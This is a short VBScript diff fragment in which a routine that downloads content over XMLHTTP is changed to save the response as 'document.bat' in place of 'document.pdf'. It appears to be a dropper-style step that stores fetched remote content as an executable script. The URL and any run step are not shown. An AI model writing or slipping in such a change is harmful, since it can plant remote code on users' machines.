@@ -11,7 +11,7 @@ If oXMLHTTP.Status = 200 Then
     oStream.Open
     oStream.Type = 1
     oStream.Write oXMLHTTP.responseBody
-    oStream.SaveToFile "document.pdf"
+    oStream.SaveToFile "document.bat"
     oStream.Close
 End If
 
